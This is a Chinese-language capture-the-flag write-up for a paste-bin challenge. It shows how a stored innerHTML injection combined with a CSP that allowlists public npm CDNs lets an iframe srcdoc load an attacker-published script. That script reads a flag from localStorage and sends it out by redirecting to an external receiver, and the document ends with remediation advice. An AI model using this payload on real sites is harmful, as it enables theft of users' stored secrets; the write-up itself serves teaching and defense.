# paste_bin

## 题目简述

题目允许用户保存任意 Paste 内容，并让管理员 Bot 访问指定 Paste。前端把数据库内容写入 `innerHTML`，形成存储型 HTML 注入；页面虽然设置了 CSP，却把可由任意用户发布 npm 包的 `unpkg.com` 和 `cdn.jsdelivr.net` 加入了脚本白名单。目标是借此执行外部脚本，读取 Bot 同源 `localStorage` 中的 flag 并外带。

## 解题过程

### 1. 确认注入点和 flag 位置

`static/view.js` 取回 Paste 后直接赋给 `innerHTML`，没有任何转义或过滤：

```javascript
const data = await response.json();
contentDiv.innerHTML = data.content;
```

Bot 的访问流程则是先打开站点首页，在该源下写入 flag，再打开被举报的 Paste：

```rust
let flag = env::var("FLAG").unwrap_or("flag{test}".to_string());
let js = format!("localStorage.setItem('flag', '{}');", flag);

c.goto("http://web:8000/").await?;
c.execute(&js, vec![]).await?;
c.goto(&format!("http://web:8000/view?id={}", id)).await?;
```

因此攻击脚本只要在 `/view` 的同源上下文执行，就能通过 `localStorage.getItem("flag")` 取得秘密。

### 2. 分析 CSP

`view.html` 设置的策略为：

```text
base-uri 'none'; style-src 'unsafe-inline'; script-src 'self' 'sha256-mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=' cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net;
```

`script-src` 没有 `'unsafe-inline'`，所以普通的内联脚本会被阻止：

```html
<script>alert(1)</script>
```

但策略允许从 `unpkg.com` 和 `cdn.jsdelivr.net` 加载脚本。这两个域名会直接分发公开 npm 包中的文件，攻击者可以发布一个自有包，从白名单域加载任意 JavaScript。CSP 也没有设置 `default-src`、`connect-src` 或 `navigate-to`，因此脚本还可以通过页面跳转向外部地址发送数据。

### 3. 准备外部脚本

作者用于解题的 npm 包为 `my-package-x1r0z@1.1.0`，其中 `exp.js` 的关键内容如下；正文已经给出完整逻辑，不依赖外部页面才能理解：

```javascript
const flag = localStorage.getItem("flag");
location.href =
    "http://host.docker.internal:8001/?flag=" + encodeURIComponent(flag);
```

实际攻击时应把接收地址换成自己可访问的 HTTP/HTTPS 日志服务。发布后，该文件可通过以下 CSP 白名单地址加载：

```text
https://unpkg.com/my-package-x1r0z@1.1.0/exp.js
```

### 4. 用 `iframe srcdoc` 触发脚本

直接通过 `innerHTML` 插入的 `<script>` 通常不会执行。这里使用 `iframe` 的 `srcdoc` 属性创建一个会重新解析 HTML 的子文档，并在其中加载白名单脚本：

```html
<iframe srcdoc="<script src='https://unpkg.com/my-package-x1r0z@1.1.0/exp.js'></script>"></iframe>
```

该 iframe 没有 `sandbox`，`about:srcdoc` 继承父页面的源和 CSP：外部脚本因来自 `unpkg.com` 而被允许，同时仍可读取同源 `localStorage`。脚本执行后，iframe 导航到接收端，查询参数中即包含 flag。

完整操作顺序为：

1. 在首页创建包含上述 iframe 的 Paste，记录返回的 UUID；
2. 先用自己的浏览器访问 `/view?id=<UUID>`，确认外部脚本能加载；
3. 在 `/report` 提交该 UUID，让 Bot 访问；
4. 在接收端日志中读取 `flag` 参数。

得到：

```text
0xGame{easy_csp_bypass_in_rust-e928e182b4fd}
```

## 方法总结

本题的 CSP 并非完全失效，而是信任边界设置错误：允许加载“任何人都能向其发布内容”的公共包 CDN，等价于把脚本执行权交给所有 npm 发布者。修复时既要对 Paste 内容做 HTML 清洗或文本化输出，也要移除过宽的脚本源，并通过 nonce 或固定哈希精确授权本站所需脚本。
